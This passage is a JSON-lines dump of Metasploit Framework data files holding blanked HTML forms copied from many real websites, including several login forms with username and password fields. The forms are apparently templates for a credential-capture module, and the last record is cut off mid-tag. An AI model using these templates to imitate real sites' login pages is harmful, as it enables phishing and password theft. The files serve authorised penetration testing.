{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/slashdot.org.txt", "content": "<form action='//slashdot.org/search.pl' method='get'> <input name=\"query\" type=\"text\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form action='//slashdot.org/login.pl' method='post'> <input name=\"unickname\" size=\"20\" type=\"text\" value=\"\" /><input name=\"returnto\" type=\"hidden\" value=\"\" /><input name=\"op\" type=\"hidden\" value=\"\" /><input name=\"upasswd\" size=\"20\" type=\"password\" /><input name=\"login_temp\" type=\"checkbox\" value=\"\" /><input name=\"userlogin\" class=\"button\" type=\"submit\" value=\"\" /></form><form action='//slashdot.org/pollBooth.pl' method='post'> <input name=\"qid\" type=\"hidden\" value=\"\" /><input name=\"section\" type=\"hidden\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input name=\"aid\" type=\"radio\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='//slashdot.org/login.pl' method='post'> <input name=\"unickname\" size=\"20\" type=\"text\" value=\"\" /><input name=\"returnto\" type=\"hidden\" value=\"\" /><input name=\"op\" type=\"hidden\" value=\"\" /><input name=\"upasswd\" size=\"20\" type=\"password\" /><input name=\"login_temp\" type=\"checkbox\" value=\"\" /><input name=\"userlogin\" class=\"button\" type=\"submit\" value=\"\" /></form><form action='http://freshmeat.net/search/' method='get'> <input name=\"link\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" /></form><form action='//slashdot.org/search.pl' method='get'> <input name=\"query\" size=\"20\" type=\"text\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:23.802235"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/slickdeals.net.txt", "content": "<form action='/sdsearch.php' method='get'> <input name=\"mode\" type=\"hidden\" value=\"\" /><input name=\"titleonly\" tabindex=\"1002\" type=\"checkbox\" id=\"rb_fd_spsdtsd\" value=\"\" /><input name=\"showposts\" tabindex=\"1003\" checked=\"checked\" type=\"radio\" id=\"rb_nb_spsd0\" value=\"\" /><input name=\"showposts\" tabindex=\"1004\" type=\"radio\" id=\"rb_nb_spsd1\" value=\"\" /><input name=\"search\" type=\"text\" id=\"search_box\" value=\"\" /><input type=\"submit\" id=\"searchbar_submit\" value=\"\" /></form><form action='login.php' method='post' onsubmit='md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)'> <input name=\"vb_login_username\" tabindex=\"101\" size=\"10\" class=\"bginput\" type=\"text\" id=\"navbar_username\" accesskey=\"u\" value=\"\" onfocus=\"if (this.value == 'User Name') this.value = '';\" style=\"font-size: 11px\" /><input name=\"vb_login_password\" tabindex=\"102\" size=\"10\" class=\"bginput\" type=\"password\" accesskey=\"p\" style=\"font-size: 11px\" /><input name=\"cookieuser\" tabindex=\"103\" checked=\"checked\" type=\"checkbox\" id=\"cb_cookieuser_navbar\" accesskey=\"c\" value=\"\" /><input tabindex=\"104\" class=\"button\" title=\"Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself.\" type=\"submit\" accesskey=\"s\" value=\"\" /><input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"do\" type=\"hidden\" value=\"\" /><input name=\"vb_login_md5password\" type=\"hidden\" /><input name=\"vb_login_md5password_utf\" type=\"hidden\" /></form><form action='' id='akst_form_action' method='post'> <input name=\"sendtoname\" class=\"akst_text\" type=\"text\" value=\"\" /><input name=\"sendtoemail\" class=\"akst_text\" type=\"text\" value=\"\" /><input name=\"emailsubject\" class=\"akst_text\" type=\"text\" id=\"akst_email_subject\" value=\"\" /><input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"do\" type=\"hidden\" value=\"\" /><input name=\"t\" type=\"hidden\" id=\"akst_post_hidden_t\" value=\"\" /><input name=\"url\" type=\"hidden\" id=\"akst_post_hidden_url\" value=\"\" /><input name=\"akst_submit\" type=\"submit\" value=\"\" /><input name=\"akst_action\" type=\"hidden\" value=\"\" /><input name=\"akst_post_id\" type=\"hidden\" id=\"akst_post_id\" value=\"\" /></form><form action='sdtag_ajax.php?do=tagthread' id='sdtag_form' onsubmit='return sdtag_prepare_submit(this);' method='post'> <input name=\"threadid\" type=\"hidden\" id=\"threadid\" value=\"\" /><input name=\"dealtag\" type=\"hidden\" id=\"dealtag\" value=\"\" /><input name=\"f\" type=\"hidden\" value=\"\" /><input name=\"tag\" class=\"tagform_input\" type=\"text\" id=\"addsdtag_txt\" /><input name=\"commit\" class=\"tagform_submit\" type=\"submit\" id=\"sdtag_submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:24.162093"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/slide.com.txt", "content": "<form name='s' action='/search' method='GET' onsubmit='setActionCookie(1, 6, slide.com); return (qry.value !=);'> <input name=\"qry\" type=\"text\" value=\"\" /><input name=\"safe\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='/msignup_process' id='loginform' method='post'> <input name=\"next\" type=\"hidden\" value=\"\" /><input name=\"xaction\" type=\"hidden\" value=\"\" /><input name=\"username\" type=\"text\" value=\"\" style=\"width:175px;\" /><input name=\"password\" type=\"password\" style=\"width:175px;\" /><input class=\"loginbutton\" type=\"submit\" value=\"\" onclick=\"this.form.xaction.value='signin'; setActionCookie(1, 4, 'slide.com'); return validateSignup(this.form.username.value, this.form.password.value, false, true, $('errordisplay'));\" style=\"color: #fff; font-weight: bold; background-color: #7fc4e6;\" /><input name=\"remember\" checked=\"checked\" type=\"checkbox\" id=\"remember\" /></form><form enctype='multipart/form-data' action='http://upload.slide.com/r/1/25/ub/21199188025%(date)s/http_3A_2F_2Fwww.slide.com_2Farrange_5Fprocess_3Fsk_3D0_26xaction_3Dhost_5Fimages_26th_3D0/' method='POST' accept-charset='utf-8'> <input name=\"binary_data\" size=\"20\" onkeydown=\"return false;\" type=\"file\" id=\"progressBarbinary_data\" onchange=\"return doUploadprogressBar(this, null, '', null);\" style=\"height:20px; font-size: 10pt; font-weight:bold;\" /></form>", "timestamp": "2025-10-24T23:41:24.486905"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/so-net.ne.jp.txt", "content": "<form name='form-search' action='http://www.so-net.ne.jp/share/cgi-bin/search/search.cgi' onsubmit='return gooSearch();' id='form-search' method='get'> <input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"keyword\" class=\"search-input\" type=\"text\" /></form><form name='form-search2' action='http://www.so-net.ne.jp/share/cgi-bin/search/search.cgi' onsubmit='return gooSearch2();' id='form-search2' method='get'> <input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"keyword\" class=\"search-input\" type=\"text\" /></form>", "timestamp": "2025-10-24T23:41:24.818812"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/softonic.com.txt", "content": "<form name='currency_form' action='/cur' method='POST'> <input name=\"origin\" type=\"hidden\" value=\"\" /></form><form name='login_form' action='http://en.softonic.com/' id='login_form' method='post'> <input name=\"email\" size=\"27\" class=\"textfield\" type=\"text\" id=\"email\" /><input name=\"password\" size=\"10\" class=\"textfield\" type=\"password\" id=\"password\" /><input name=\"login\" type=\"hidden\" value=\"\" /><input name=\"submitlogin\" type=\"image\" src=\"/img/program_page/boton_go.gif\" id=\"submitlogin\" value=\"\" alt=\"Login\" /></form><form name='search_form' action='/index.phtml' id='search_form' method='get'> <input name=\"adv_search\" type=\"hidden\" id=\"adv_search\" value=\"\" /><input name=\"query\" type=\"hidden\" id=\"query\" /><input name=\"do\" type=\"hidden\" id=\"do\" value=\"\" /><input name=\"search\" size=\"41\" class=\"textfield\" type=\"text\" id=\"search\" value=\"\" /><input name=\"id_section\" type=\"hidden\" id=\"id_section\" value=\"\" /><input class=\"button_search\" type=\"image\" src=\"/img/restyling/button_search.gif\" alt=\"Go!\" /></form><form name='advanced_search_form' action='/index.phtml' id='advanced_search_form' method='get'> <input name=\"search\" type=\"hidden\" /><input name=\"id_section\" type=\"hidden\" /><input name=\"adv_search\" type=\"hidden\" value=\"\" /></form><form name='suscription' action='register.phtml' method='post'> <input name=\"email\" class=\"textfield\" type=\"text\" value=\"\" /><input type=\"image\" src=\"/img/restyling/button_community_go.gif\" alt=\"Signup\" /></form><form name='searchbar_footer' action='/' id='searchbar_footer' method='get'> <input name=\"id_section\" type=\"hidden\" value=\"\" /><input name=\"search\" class=\"textfield\" type=\"text\" id=\"search_footer\" value=\"\" /><input class=\"button_search\" type=\"image\" src=\"\" alt=\"Go!\" /></form>", "timestamp": "2025-10-24T23:41:25.142811"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/softpedia.com.txt", "content": "<form name='quicksearch' action='/progSearch' method='post' onsubmit='return validate(document.quicksearch.src)'> <input name=\"src\" size=\"15\" class=\"searchfield\" type=\"text\" id=\"src\" /><input type=\"image\" src=\"\" border=\"0\" height=\"69\" onclick=\"this.blur()\" width=\"53\" /></form>", "timestamp": "2025-10-24T23:41:25.474630"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sogou.com.txt", "content": "<form name='searchForm' action='/web' id='searchForm' onsubmit='this._ast.value=Math.round(new Date().getTime()/1000);'> <input name=\"query\" size=\"35\" class=\"query\" onfocus=\"this.select()\" maxlength=\"100\" /><input class=\"submitbtn\" type=\"submit\" value=\"\" onclick=\"if(this.form.query.value==''){return false;}\" /><input name=\"_asf\" type=\"hidden\" value=\"\" /><input name=\"_ast\" type=\"hidden\" value=\"\" /><input name=\"w\" type=\"hidden\" value=\"\" /><input name=\"p\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:25.769277"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sohu.com.txt", "content": "<form name='searchForm' action='http://www.sogou.com/sohu' id='searchForm' method='get' onsubmit='return checkKw();' target='_blank'> <input name=\"query\" class=\"sInputA\" type=\"text\" value=\"\" onfocus=\"erase(this);\" onblur=\"recovery(this);\" style=\"color:#666;font-size:14px;\" /><input name=\"p\" type=\"hidden\" id=\"pid\" value=\"\" /><input name=\"w\" type=\"hidden\" id=\"rid\" value=\"\" /><input name=\"_asf\" type=\"hidden\" value=\"\" /><input name=\"_ast\" type=\"hidden\" id=\"ast\" value=\"\" /><input name=\"md\" type=\"hidden\" id=\"saymd\" /><input name=\"name\" type=\"hidden\" id=\"sayname\" /><input name=\"rturl\" type=\"hidden\" id=\"rturl\" value=\"\" /><input name=\"dtype\" type=\"hidden\" id=\"dtype\" value=\"\" /><input name=\"ds\" type=\"hidden\" id=\"ds\" value=\"\" /><input name=\"provider\" type=\"hidden\" id=\"po\" value=\"\" /><input name=\"key\" type=\"hidden\" id=\"key\" value=\"\" /><input class=\"sInputB\" type=\"submit\" value=\"\" /></form><form name='form1x' action='http://db.auto.sohu.com/searchQuery.sip' target='_blank'> <input name=\"queryTerm\" class=\"sInputA\" type=\"input\" value=\"\" onclick=\"this.value=''\" /><input name=\"pageNo\" type=\"hidden\" value=\"\" /><input class=\"sInputB\" type=\"submit\" value=\"\" /></form><form action='http://house.focus.cn/housemarket/house_search/index.php' target='_blank' style='width:188px;'> <input name=\"title\" class=\"sInputA\" type=\"input\" onmouseover=\"this.focus()\" value=\"\" onfocus=\"this.select()\" onclick=\"this.value=''\" style=\"width:68px;\" /><input name=\"Submit_btn\" class=\"sInputB\" type=\"submit\" value=\"\" /></form><form name='digi_form' action='http://act.it.sohu.com/product_mobile/search.php' method='get' target='_blank'> <input name=\"keyword\" class=\"sInputA\" type=\"text\" id=\"keyword\" value=\"\" onclick=\"this.value=''\" /><input class=\"sInputB\" type=\"submit\" value=\"\" /></form><form name='search' action='http://baodian.women.sohu.com/what_new.php' method='post' style='margin:0px' target='_blank'> <input name=\"keyword\" class=\"sInputA\" type=\"input\" value=\"\" onclick=\"this.value=''\" /><input class=\"sInputB\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:26.181938"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sonico.com.txt", "content": "<form action='/register.php' id='register-home' method='POST'> <input name=\"must_try_login\" type=\"hidden\" value=\"\" /><input name=\"first_name\" title=\"Los nombres y apellidos se moderan para verificar su legitimidad\" class=\"fr-200 tipped\" type=\"text\" id=\"name\" /><input name=\"last_name\" title=\"Los nombres y apellidos se moderan para verificar su legitimidad\" class=\"fr-200 tipped\" type=\"text\" id=\"name\" /><input name=\"email\" title=\"Ingresa tu email correctamente. Deber&aacute;s confirmar tu email para usar Sonico.\" class=\"fr-200 tipped\" type=\"text\" id=\"email\" /><input name=\"password\" type=\"password\" /><input name=\"password_2\" type=\"password\" id=\"password2\" /><input class=\"but bold\" type=\"submit\" value=\"\" /></form><form class='cmxform' action='http://www.sonico.com/login.php' id='form-login' method='post' onsubmit='$(#loginbtn).attr(disabled, true)'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"email\" class=\"inputbig\" id=\"name\" /><input name=\"password\" class=\"inputbig\" type=\"password\" id=\"address1\" /><input name=\"remember_password\" class=\"fr-20\" type=\"checkbox\" id=\"football\" /><input name=\"login\" type=\"hidden\" value=\"\" /><input name=\"login\" class=\"btn btn-login\" type=\"submit\" id=\"loginbtn\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:26.500464"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/soso.com.txt", "content": "<form name='flpage' action='q'> <input name=\"pid\" type=\"hidden\" value=\"\" /><input name=\"w\" autocomplete=\"off\" class=\"s bor\" type=\"text\" onkeyup=\"userInput(this.value,'sb',event);\" id=\"sb\" maxlength=\"64\" /><input class=\"bt\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:26.804541"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/soufun.com.txt", "content": "<form name='form1' action='http://passport.soufun.com/checkuser.aspx' method='post' onsubmit='return user_check(this);'> </form><form name='form_newhouse' action='http://www.soufun.com/house/newhouse/Search_Result.aspx' id='form_newhouse' onsubmit='return form_action()' method='post' target='newhouse_search'> <input name=\"StrNameKey\" type=\"hidden\" value=\"\" /><input name=\"StrNameKeyword\" size=\"10\" type=\"text\" id=\"input_keyw\" onkeyup=\"javascript:if(StrNameKeyword.value=='\u8f93\u5165\u5173\u952e\u5b57'){StrNameKeyword.style.color='#999999';}else{StrNameKeyword.style.color='#000000';}\" value=\"\" onfocus=\"javascript:if (StrNameKeyword.value=='\u8f93\u5165\u5173\u952e\u5b57') {StrNameKeyword.value=''}\" style=\"color:#999999;\" onblur=\"javascript:if (StrNameKeyword.value==''){StrNameKeyword.value='\u8f93\u5165\u5173\u952e\u5b57';StrNameKeyword.style.color='#999999'}\" /><input name=\"imageField2\" class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" id=\"Image1\" border=\"0\" /></form><form action='http://esf.soufun.com/newsecond/sale_info/searchlist.aspx' id='form_cs' onsubmit='return cs_splithx(),cs_splitPrice();' method='post' target='_blank'> <input name=\"Province\" type=\"hidden\" id=\"cs_Province\" /><input name=\"room\" type=\"hidden\" id=\"cs_room\" /><input name=\"hall\" type=\"hidden\" id=\"cs_hall\" /><input name=\"pricemin\" type=\"hidden\" id=\"cs_pricemin\" /><input name=\"pricemax\" type=\"hidden\" id=\"cs_pricemax\" /><input name=\"businesstype\" type=\"hidden\" id=\"businesstype\" value=\"\" /><input name=\"renttype\" type=\"hidden\" id=\"Hidden11\" value=\"\" /><input name=\"saletype\" type=\"hidden\" value=\"\" /><input name=\"housetype\" type=\"hidden\" id=\"housetype\" /><input name=\"keyword\" class=\"inputselc1 grayn bordertxt sp3 txtwdh8\" type=\"text\" id=\"cs_keyword\" onkeyup=\"javascript:if(document.getElementById('cs_keyword').value=='\u671f\u671b\u533a\u57df'){document.getElementById('cs_keyword').style.color='#999999';}else{document.getElementById('cs_keyword').style.color='#000000';}\" value=\"\" onfocus=\"javascript:if (document.getElementById('cs_keyword').value=='\u671f\u671b\u533a\u57df') {document.getElementById('cs_keyword').value=''}\" style=\"color:#999999;\" onblur=\"javascript:if (document.getElementById('cs_keyword').value==''){document.getElementById('cs_keyword').value='\u671f\u671b\u533a\u57df';document.getElementById('cs_keyword').style.color='#999999';}\" /><input class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" /></form><form action='http://rent.soufun.com/rent/rent_info/searchList.aspx' id='form_cz' onsubmit='return cz_splithx(),cz_splitPrice();' method='post' target='_blank'> <input name=\"Province\" type=\"hidden\" id=\"cz_Province\" /><input name=\"room\" type=\"hidden\" id=\"cz_room\" /><input name=\"hall\" type=\"hidden\" id=\"cz_hall\" /><input name=\"pricemin\" type=\"hidden\" id=\"cz_pricemin\" /><input name=\"pricemax\" type=\"hidden\" id=\"cz_pricemax\" /><input name=\"businesstype\" type=\"hidden\" id=\"businesstype\" value=\"\" /><input name=\"renttype\" type=\"hidden\" id=\"businesstype\" value=\"\" /><input name=\"housetype\" type=\"hidden\" id=\"housetype\" /><input name=\"keyword\" class=\"inputselc1 grayn bordertxt sp3 txtwdh8\" type=\"text\" id=\"cz_keyword\" onkeyup=\"javascript:if(document.getElementById('cz_keyword').value=='\u671f\u671b\u533a\u57df'){document.getElementById('cz_keyword').style.color='#999999';}else{document.getElementById('cz_keyword').style.color='#000000';}\" value=\"\" onfocus=\"javascript:if (document.getElementById('cz_keyword').value=='\u671f\u671b\u533a\u57df') {document.getElementById('cz_keyword').value=''}\" style=\"color:#999999;\" onblur=\"javascript:if (document.getElementById('cz_keyword').value==''){document.getElementById('cz_keyword').value='\u671f\u671b\u533a\u57df';document.getElementById('cz_keyword').style.color='#999999';}\" /><input class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" /></form><form action='http://search.soufun.com/news/search.jsp' id='form_news' method='get' target='_blank'> <input name=\"q\" type=\"text\" style=\"width:180px; border:1px solid #3c61a4;\" /><input name=\"forumSubmit\" class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" /></form><form name='formsearch' id='formsearch' method='get' onsubmit='return _submitBBS()' target='forumSearch'> <input name=\"q\" type=\"text\" id=\"key\" style=\"width:180px; border:1px solid #3c61a4;\" /><input class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" style=\"cursor:pointer;\" /><input name=\"fld\" type=\"hidden\" value=\"\" /><input name=\"cat\" type=\"hidden\" value=\"\" /></form><form name='Blog_Search' action='http://search.soufun.com/blog/search.jsp' id='Blog_Search' method='get' target='_blank'> <input name=\"fld\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" style=\"width:280px; border:1px solid #3c61a4;\" /><input class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" /></form><form name='searchForm' action='http://home.soufun.com/jiancai/product/search.htm' method='post' target='_blank'> <input name=\"keywords\" type=\"text\" style=\"width:300px; border:1px solid #3c61a4;\" /><input class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" /></form><form name='Search' action='http://search.soufun.com/images/search.jsp' id='Search' method='get' target='_blank'> <input name=\"ca\" type=\"hidden\" value=\"\" /><input name=\"chanl\" type=\"hidden\" value=\"\" /><input name=\"chanl\" type=\"hidden\" value=\"\" /><input name=\"chanl\" type=\"hidden\" value=\"\" /><input name=\"chanl\" type=\"hidden\" value=\"\" /><input name=\"chanl\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" style=\"width:180px; border:1px solid #3c61a4;\" /><input class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search.gif\" /></form><form action='http://www.soufun.com/ask/search.aspx' method='post' target='_blank'> <input name=\"asktitle\" type=\"text\" style=\"width:380px;border:1px \r\nsolid #3c61a4;\" /><input class=\"search_sousuo01_img\" type=\"image\" src=\"images/an_search_wen1.gif\" /></form><form name='bbs_search' action='http://bbs.soufun.com/asp/bbs/proj_search_result_new.asp' onsubmit='javascript:if(document.bbs_search.key.value==){alert(\u8bf7\u8f93\u5165\u8bba\u575b\u5173\u952e\u5b57);event.returnValue=false;}' method='post' target='forumSearch'> <input name=\"key\" type=\"text\" style=\"width:130px;border:1px solid #3c61a4;margin-top:3px;margin-left:22px;\" /><input name=\"forumSubmit\" type=\"image\" src=\"images/an_ye.gif\" border=\"0\" height=\"18\" style=\"vertical-align:middle;margin-left:5px;\" width=\"65\" /></form><form action='http://pinggu.soufun.com/estimate/process/to_first.aspx' style='border:0px;margin:0px;padding:0px;'> <input name=\"projname\" type=\"text\" id=\"projname\" style=\"width:80px;margin-left:5px;vertical-align:middle;\" /><input name=\"imageField\" type=\"image\" src=\"images/an_er.gif\" border=\"0\" style=\"vertical-align:middle;\" /></form>", "timestamp": "2025-10-24T23:41:27.116444"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sourceforge.net.txt", "content": "<form name='searchform' action='/search/' method='get'> <input name=\"type_of_search\" type=\"hidden\" value=\"\" /><input name=\"words\" tabindex=\"1\" type=\"text\" id=\"searchbox\" value=\"\" /><input tabindex=\"0\" type=\"submit\" id=\"searchsubmit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:27.420939"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/spankwire.com.txt", "content": "<form name='aspnetForm' action='Default.aspx' method='post' id='aspnetForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"ctl00$searchText\" type=\"text\" id=\"ctl00_searchText\" /><input name=\"searchButton\" class=\"searchbtn\" type=\"submit\" id=\"ctl00_searchbtn\" value=\"\" /><input name=\"username\" type=\"text\" /><input name=\"password\" type=\"password\" /><input type=\"checkbox\" /><input type=\"submit\" id=\"login-btn\" value=\"\" onclick=\"login2()\" /></form>", "timestamp": "2025-10-24T23:41:27.761199"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/spiegel.de.txt", "content": "<form name='spsuchform' action='http://wissen.spiegel.de/wissen/resultset.html;iso' method='get'> <input name=\"suchbegriff\" type=\"text\" id=\"spSearchInput\" /><input name=\"site\" type=\"hidden\" value=\"\" /></form><form name='spHPsuchform' action='http://wissen.spiegel.de/wissen/resultset.html;iso' method='get'> <input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"suchbegriff\" type=\"text\" id=\"spHPSearchInput\" /></form><form action='http://boersen.manager-magazin.de/spo_mmo/kurse_einzelkurs_suche.htm' method='post' target='Boerse'> <input name=\"sektion\" type=\"hidden\" value=\"\" /><input name=\"button\" type=\"hidden\" value=\"\" /><input name=\"kursesuchen\" title=\"Kurssuche starten\" type=\"image\" src=\"/static/sys/v8/icons/ic_submit.gif\" border=\"0\" height=\"17\" alt=\"&gt;&gt;\" width=\"17\" style=\"float:right; margin:0; padding:0\" /><input name=\"suchbegriff\" type=\"text\" value=\"\" onfocus=\"if (this.value == ' Kurse abfragen') this.value='';\" style=\"width:100px; margin:1px 0 0 0; padding: 0; border: 1px solid #ccc; font-family: verdana, sans-serif; font-size: 10px; line-height: 13px; height:13px; display:block; float:right;\" /></form><form class='searchBox clearit' action='http://lastfm.spiegel.de/listen/' method='post' id='listenPageStarter' target='Radio' style='margin:6px 0 1px 0;'> <input name=\"to\" type=\"hidden\" id=\"to\" value=\"\" /><input name=\"userInput\" class=\"searchfield\" type=\"text\" id=\"userInput\" value=\"\" onfocus=\"if (this.value == ' K\u00fcnstler eingeben') this.value='';\" style=\"width:130px;border:1px solid rgb(204, 204, 204);margin:0 4px 0 0;padding:0;font-family:verdana,sans-serif;font-size:10px;line-height:13px;height:13px;display:block;float:left;\" /><input class=\"submit\" type=\"image\" src=\"\" id=\"playButton\" value=\"\" /></form><form name='spAutoDbSuchmaskeSpaltenkasten' action='http://www1.spiegel.de/active/autodb/fcgi/autodb.fcgi' method='get'> <input name=\"spSearchExtended\" type=\"hidden\" value=\"\" /><input name=\"spShowResult\" type=\"hidden\" value=\"\" /><input name=\"suchbegriff\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:28.077712"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/squidoo.com.txt", "content": "<form name='searchForm' action='http://www.squidoo.com/search/results' method='post' onsubmit='return processSearch();'> <input name=\"query\" class=\"searchField\" type=\"text\" id=\"query\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:28.405950"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/starware.com.txt", "content": "<form action='http://as.starware.com/dp/search'> <input name=\"src_id\" type=\"hidden\" value=\"\" /><input name=\"product\" type=\"hidden\" value=\"\" /><input name=\"qry\" size=\"40\" class=\"t\" value=\"\" maxlength=\"120\" /><input name=\"z\" class=\"i\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:28.731043"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/studiverzeichnis.com.txt", "content": "<form action='https://secure.studivz.net/Login' id='Login' method='post'> <input name=\"email\" class=\"fieldText\" type=\"text\" id=\"Login_email\" value=\"\" /><input name=\"password\" class=\"fieldText\" type=\"password\" id=\"Login_password\" value=\"\" /><input name=\"login\" class=\"fieldBtnSubmit\" type=\"submit\" value=\"\" /><input name=\"jsEnabled\" type=\"hidden\" id=\"jsEnabled\" value=\"\" /><input name=\"formkey\" type=\"hidden\" value=\"\" /><input name=\"iv\" type=\"hidden\" value=\"\" /><input name=\"checkcode\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:29.052389"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/symantec.com.txt", "content": "<form name='searchSym' action='http://searchg.symantec.com/search?' onsubmit='return searchFormAction(Search,q)' id='search' method='get'> <input name=\"q\" size=\"20\" class=\"inputBdr\" type=\"text\" value=\"\" onfocus=\"clearInputValue(this)\" maxlength=\"100\" onblur=\"writeInputValue(this, 'Search')\" /><input name=\"charset\" type=\"hidden\" value=\"\" /><input name=\"proxystylesheet\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"hitsceil\" type=\"hidden\" value=\"\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"output\" type=\"hidden\" value=\"\" /><input name=\"context\" type=\"hidden\" value=\"\" /><input type=\"image\" src=\"/images/masthead/sym-search-arrow.gif\" alt=\"OK\" /></form>", "timestamp": "2025-10-24T23:41:29.352390"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tagged.com.txt", "content": "<form name='nav_searchbox' action='http://www.tagged.com/search_results.html' method='GET'> <input name=\"search_type\" type=\"hidden\" value=\"\" /><input name=\"search_term\" class=\"search\" type=\"text\" id=\"search_term\" /><input class=\"orangeBtn\" type=\"button\" id=\"search_submit\" value=\"\" onclick=\"return document.forms['nav_searchbox'].submit();\" /></form><form name='location_search' action='browse.html' method='POST'> <input name=\"fldSearchType\" type=\"hidden\" value=\"\" /><input name=\"fldOnlyOnline\" type=\"hidden\" value=\"\" /><input name=\"fldOnlyWithPhoto\" type=\"hidden\" value=\"\" /><input name=\"fldLocationRange\" type=\"hidden\" value=\"\" /><input name=\"fldLocation\" type=\"text\" id=\"city\" /><input class=\"greyBtn\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:29.677210"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/target.com.txt", "content": "<form name='search' title='Site Search' action='/gp/search/602-4176916-1659816'> <input name=\"field-keywords\" size=\"16\" title=\"Search Keywords\" class=\"nav4_Search\" type=\"text\" id=\"searchKeywords\" /><input name=\"ref\" type=\"hidden\" id=\"ref\" value=\"\" /><input title=\"Search Submit\" src=\"\" type=\"image\" value=\"\" alt=\"GO\" /></form><form name='babyreg' title='Target Baby' action='/gp/registry/search.html/602-4176916-1659816' id='babyreg' method='post'> <input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"role\" checked=\"checked\" title=\"Mother\" type=\"radio\" id=\"mother\" value=\"\" alt=\"Mother\" /><input name=\"role\" title=\"Father\" type=\"radio\" id=\"father\" value=\"\" alt=\"Father\" /><input name=\"firstname\" title=\"First Name\" class=\"GN_NAV2DD_GR_TB_TEXT\" type=\"text\" id=\"firstName\" alt=\"first name\" /><input name=\"lastname\" title=\"Last Name\" class=\"GN_NAV2DD_GR_TB_TEXT\" type=\"text\" id=\"lastName\" alt=\"last name\" /></form><form name='clubwedd' title='Club Wedd' action='/gp/registry/search.html/602-4176916-1659816' id='clubwedd' method='post'> <input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"role\" checked=\"checked\" title=\"Bride\" type=\"radio\" id=\"bride\" value=\"\" alt=\"Bride\" /><input name=\"role\" title=\"Groom\" type=\"radio\" id=\"groom\" value=\"\" alt=\"Groom\" /><input name=\"firstname\" title=\"First Name\" class=\"GN_NAV2DD_GR_CW_TEXT\" type=\"text\" id=\"firstName\" alt=\"first name\" /><input name=\"lastname\" title=\"Last Name\" class=\"GN_NAV2DD_GR_CW_TEXT\" type=\"text\" id=\"lastName\" alt=\"last name\" /></form><form name='findlist' action='/lists/find?ref=nav_listfind' method='post'> <input 